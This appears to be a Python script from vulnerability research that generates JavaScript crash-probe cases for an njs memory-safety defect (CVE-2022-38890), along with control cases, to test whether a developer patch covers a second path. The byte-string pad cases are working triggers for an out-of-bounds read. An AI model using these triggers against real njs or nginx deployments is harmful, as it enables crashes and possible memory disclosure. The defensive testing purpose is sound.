"""Supplementary crash-probe case set for njs.cve-2022-38890: defect (b),
njs_string_prototype_pad() trusting a byte-string pad's recorded length.

Usage: python3 trimzero_padbytes_cases.py OUTDIR

These cases do NOT call any trim; they reach a length/size-inconsistent
string through a different producer than the CVE PoC: a byte-string pad
minted directly by String.bytesFrom (an njs extension), applied to a
multi-byte base with padEnd/padStart, which records a result length far
above the true UTF-8 character count. A later length-indexing consumer
(lastIndexOf/indexOf) then reads the offset map out of bounds, the same
faulty state and frames as the reported PoC, independent of njs_string_trim.

This set is the verification of the blind second reading's phase 2
supplementary finding. It is run on the base, developer-patch and
origin/master builds to show that the developer patch does not touch this
producer and to record whether it is still reachable at master (where njs
removed the byte-string API in 2024; if String.bytesFrom is absent the
probe raises a TypeError instead, class WRONG).

Each case completes with the marker DONE when it does not fault; the
reference class is DONE (no sanitizer report) and the expected.tsv is
written by hand, because the byte-string producer is an njs extension with
no Node.js equivalent, so the oracle here is "no sanitizer report", not a
Node value. A case that faults is ASAN; a case that raises (for example a
missing extension at master) prints E:<name> and is WRONG; a case that
completes prints DONE and is OK.

Families (case name prefix):
  pb_<producer>_<consumer>  a byte-string pad + pad to length 512 on a
                            multi-byte base, then a length-indexing consumer
  pbctl_<consumer>          the same consumer on a padEnd with an ordinary
                            one-character pad (no byte string): a valid
                            control that must not fault on any build
"""
import sys
from pathlib import Path

BS = chr(92)

# A multi-byte base character (U+0864, 3 bytes in UTF-8) as a \u escape.
BASE = '"' + BS + 'u0864"'
# A byte-string pad of three bytes (the UTF-8 bytes of U+1864), minted by the
# njs extension String.bytesFrom; size 3.
PAD = "String.bytesFrom([0xe1, 0xa1, 0xa4])"
NEEDLE = '"1234567890123456"'   # a 16-character needle, so index = length - 16 >= 32

PRELUDE = (
    "function done(f) { try { f(); print('DONE'); } catch (e) { print('E:' + e.name); } }\n"
)

CASES = {
    # byte-string pad -> padEnd 512 on a multi-byte base -> length-indexing consumer
    "pb_padEnd_lastIndexOf":
        "var pad = %s;\nvar s = %s.padEnd(512, pad);\ndone(function() { s.lastIndexOf(%s); });\n"
        % (PAD, BASE, NEEDLE),
    "pb_padEnd_indexOf":
        "var pad = %s;\nvar s = %s.padEnd(512, pad);\ndone(function() { s.indexOf(%s, 40); });\n"
        % (PAD, BASE, NEEDLE),
    "pb_padStart_lastIndexOf":
        "var pad = %s;\nvar s = %s.padStart(512, pad);\ndone(function() { s.lastIndexOf(%s); });\n"
        % (PAD, BASE, NEEDLE),
    # valid control: ordinary one-character pad, no byte string
    "pbctl_padEnd_lastIndexOf":
        "var s = %s.padEnd(512, %s);\ndone(function() { s.lastIndexOf(%s); });\n"
        % (BASE, '"x"', NEEDLE),
    "pbctl_padEnd_indexOf":
        "var s = %s.padEnd(512, %s);\ndone(function() { s.indexOf(%s, 40); });\n"
        % (BASE, '"x"', NEEDLE),
}


def main():
    outdir = Path(sys.argv[1])
    outdir.mkdir(parents=True, exist_ok=True)
    rows = ["case\tfamily\tabsent"]
    for name, body in CASES.items():
        (outdir / ("%s.js" % name)).write_text(PRELUDE + body)
        fam = "pb" if name.startswith("pb_") else "pbctl"
        rows.append("%s\t%s\tnone" % (name, fam))
    (outdir / "cases.tsv").write_text("\n".join(rows) + "\n")
    print("%d cases written to %s" % (len(rows) - 1, outdir))


if __name__ == "__main__":
    main()
